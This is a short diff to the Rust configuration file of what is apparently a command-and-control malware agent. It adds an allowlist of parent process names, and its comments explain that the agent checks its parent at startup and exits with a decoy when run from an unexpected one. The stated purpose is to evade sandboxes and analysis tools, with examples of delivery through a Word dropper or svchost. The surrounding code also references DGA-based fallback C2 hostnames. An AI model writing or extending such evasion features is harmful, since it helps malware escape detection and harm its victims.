@@ -277,6 +277,24 @@ pub struct C2Config {
     /// additional C2 hostnames each window as low-priority fallback endpoints.
     #[serde(default)]
     pub dga: Option<DgaConfig>,
+
+    /// Allowlist of parent process image names that are considered legitimate
+    /// spawn paths for this build (e.g. ["explorer.exe", "svchost.exe"]).
+    ///
+    /// At startup the agent resolves its own parent via NtQueryInformationProcess
+    /// and QueryFullProcessImageNameW.  If the parent's filename is NOT in this
+    /// list, the agent runs the decoy routine and exits.
+    ///
+    /// Rationale: sandbox/detonation environments and analysis tools almost
+    /// always have anomalous parent chains.  Knowing the expected delivery
+    /// path at build time (e.g. a dropper spawned from Word, or a service
+    /// installed via svchost) lets you bake a lightweight, zero-noise check
+    /// directly into the binary.
+    ///
+    /// Leave empty (default) to disable — the check is a no-op when the
+    /// list is empty, so existing configs need no changes.
+    #[serde(default)]
+    pub valid_parents: Vec<String>,
 }
 
 // ... (Rest of common.rs remains the same: ClientHello, SecuredCommand, etc.)
